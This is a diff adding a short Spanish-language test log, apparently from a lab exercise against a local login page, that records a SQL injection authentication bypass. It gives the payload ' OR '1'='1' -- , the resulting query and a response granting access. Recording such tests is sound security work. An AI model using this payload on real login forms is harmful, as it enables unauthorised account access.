@@ -1,0 +1,9 @@
+# 01 - Acceso al login sin credenciales validas
+Fecha: 2026-10-31 23:15:02
+Objetivo: http://127.0.0.1:8000/index.php (POST)
+Entrada usuario: ' OR '1'='1' -- 
+Entrada password: (vacio)
+Consulta resultante:
+  SELECT * FROM usuarios WHERE usuario = '' OR '1'='1' -- ' AND password = ''
+----- Respuesta (fragmento relevante) -----
+class="alert ok">Acceso concedido
